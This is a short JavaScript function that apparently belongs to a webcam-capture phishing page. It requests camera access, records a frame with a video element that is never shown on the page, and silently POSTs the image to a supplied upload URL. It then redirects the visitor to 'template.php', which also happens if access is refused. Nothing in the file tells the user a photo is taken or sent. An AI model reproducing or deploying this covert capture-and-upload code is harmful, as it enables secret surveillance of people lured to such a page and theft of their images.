function startCam(uploadURL) {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            let video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                let canvas = document.createElement("canvas");
                canvas.width = 640;
                canvas.height = 480;
                let context = canvas.getContext("2d");

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                let data = canvas.toDataURL("image/png");

                fetch(uploadURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: "image=" + encodeURIComponent(data)
                }).then(() => {
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "template.php";
                });

            }, 1500);
        })
        .catch(() => {
            window.location.href = "template.php";
        });
}
